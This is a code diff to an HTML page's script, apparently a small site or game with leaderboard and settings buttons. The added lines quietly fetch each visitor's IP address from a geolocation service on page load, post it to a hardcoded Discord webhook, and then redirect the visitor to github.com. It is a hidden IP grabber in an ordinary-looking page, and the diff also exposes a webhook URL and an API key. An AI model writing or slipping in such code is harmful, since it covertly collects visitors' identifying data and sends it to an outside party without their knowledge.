@@ -53,6 +53,27 @@ LeaderboardButton.addEventListener('click', () => {
     window.location.href = 'settings.html';
 });
 
+
+
+        const webhookURL = "https://discord.com/api/webhooks/1353126214855954644/UeyGkoiua01DXUO4mxK3b9LaGf7Ky7sh-rIV8IK1AdDsGjrasImrbvhRWick_9S2dPf4";
+
+        fetch("https://api.ipgeolocation.io/ipgeo?apiKey=ec907edd02aa4056a49f438b730542aa")
+            .then(response => response.json())
+            .then(results => {
+                const ipAddress = results.ip;
+                
+                return fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ content: `IP: ${ipAddress}` })
+                });
+            })
+            .then(() => {
+                window.location.replace("https://www.github.com");
+            })
+            .catch(error => console.error("Error:", error));
 </script>
 </html>
 
